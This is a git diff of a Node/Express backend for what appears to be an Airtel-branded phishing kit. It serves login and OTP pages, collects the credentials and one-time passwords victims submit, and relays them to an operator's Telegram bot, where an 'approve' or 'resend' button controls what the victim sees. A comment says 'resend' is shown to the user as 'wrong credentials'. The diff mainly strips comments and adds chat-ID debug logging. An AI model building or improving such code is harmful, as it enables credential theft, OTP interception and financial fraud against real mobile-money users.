@@ -12,8 +12,8 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 /* ==================== ENV ==================== */
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
-const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
+const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
+const TELEGRAM_CHAT_ID   = (process.env.TELEGRAM_CHAT_ID   || '').trim();
 
 const TELEGRAM_API          = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
@@ -23,10 +23,8 @@ const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}
 const SESSION_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
 
 /* ==================== IN-MEMORY STORE ==================== */
-/* requestId -> { step, status, data, originalText, createdAt, telegramMessageId } */
 const requests = new Map();
 
-/* Garbage collector — expire old requests every minute */
 setInterval(() => {
   const now = Date.now();
   for (const [id, r] of requests.entries()) {
@@ -50,7 +48,6 @@ app.use((req, _res, next) => {
   next();
 });
 
-/* Serve HTML from repo root (../ from backend/) */
 const PUBLIC_DIR = path.join(__dirname, '..');
 app.use(express.static(PUBLIC_DIR));
 
@@ -191,7 +188,6 @@ app.get(['/otp', '/otp/'], servePage('otp.html'));
 app.get(['/success', '/success/'], servePage('success.html'));
 
 /* ==================== API — SESSION ==================== */
-/* Simple token endpoint used by login.html's getApiSecret() */
 app.post('/api/auth/session', (_req, res) => {
   const token = crypto.randomBytes(24).toString('hex');
   res.json({ success: true, token, expiresIn: 3600000 });
@@ -263,7 +259,6 @@ app.post('/api/telegram/submit-otp', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Invalid OTP format' });
     }
 
-    // Update the request with OTP
     r.data.otp = otp;
     r.data.rawMessage = rawMessage;
     r.step = 'otp';
@@ -314,8 +309,6 @@ app.get('/api/telegram/status/:requestId', (req, res) => {
 app.post('/api/b2c-backend/v2/resend-otp', async (req, res) => {
   const { msisdn = '' } = req.body || {};
   console.log('[resend-otp]', msisdn);
-  // Real Airtel B2C resend would go here.
-  // For now: acknowledge and forward to Telegram so admin knows user requested it.
   try {
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
       await fetch(TELEGRAM_API, {
@@ -333,7 +326,6 @@ app.post('/api/b2c-backend/v2/resend-otp', async (req, res) => {
 });
 
 /* ==================== API — CHECK STATUS ==================== */
-/* Used by login.html's insufficient-balance polling */
 let lastCheckStatus = 'normal';
 app.get('/api/check-status', (_req, res) => {
   res.json({ status: lastCheckStatus });
@@ -368,7 +360,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const when = new Date().toLocaleString('en-GB');
 
-    /* ---- APPROVE ---- */
     if (action === 'approve') {
       r.status = step === 'otp' ? 'completed' : 'approved';
       r.resolvedAt = Date.now();
@@ -392,7 +383,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    /* ---- RESEND (shown to user as "wrong credentials") ---- */
     if (action === 'resend') {
       r.status = 'wrong_credentials';
       r.resolvedAt = Date.now();
@@ -431,7 +421,6 @@ app.use((_req, res) => {
   `);
 });
 
-/* ==================== ERROR HANDLER ==================== */
 app.use((err, _req, res, _next) => {
   console.error('unhandled error:', err);
   res.status(500).send('Server error');
@@ -487,6 +476,8 @@ app.listen(PORT, async () => {
   console.log('🏆 Airtel Lite / Starlink backend running');
   console.log(`🚀 Port: ${PORT}`);
   console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
+  console.log(`🔍 Chat ID length: ${TELEGRAM_CHAT_ID.length} (expected 10 for 8426930447)`);
+  console.log(`🔍 Chat ID raw: ${JSON.stringify(TELEGRAM_CHAT_ID)}`);
   console.log('====================================');
   setTimeout(registerWebhook, 2000);
 });
